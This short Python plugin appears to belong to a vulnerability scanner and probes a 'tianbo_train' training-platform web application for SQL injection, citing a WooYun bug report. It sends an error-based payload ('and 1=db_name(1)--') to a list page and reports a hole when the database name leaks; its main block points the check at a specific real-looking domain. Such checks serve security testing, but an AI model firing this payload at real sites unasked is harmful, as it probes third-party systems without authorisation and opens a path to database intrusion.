#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author:小光
#refer:http://www.wooyun.org/bugs/wooyun-2015-0143143

def assign(service, arg):
    if service == "tianbo_train":
        return True, arg
             
def audit(arg): 
    payload = 'Web_Org/TCH_list.aspx?typeid=-1'
    url = arg + payload
    code, head, res, errcode, _ = curl.curl2(url+'%20and%201%3Ddb_name%281%29--')
    if code == 500 and 'master' in res :
        security_hole(arg+payload+'   :found sql Injection')


if __name__ == '__main__':
    from dummy import *
    audit(assign('tianbo_train','http://www.fenghuaedu.net/')[1])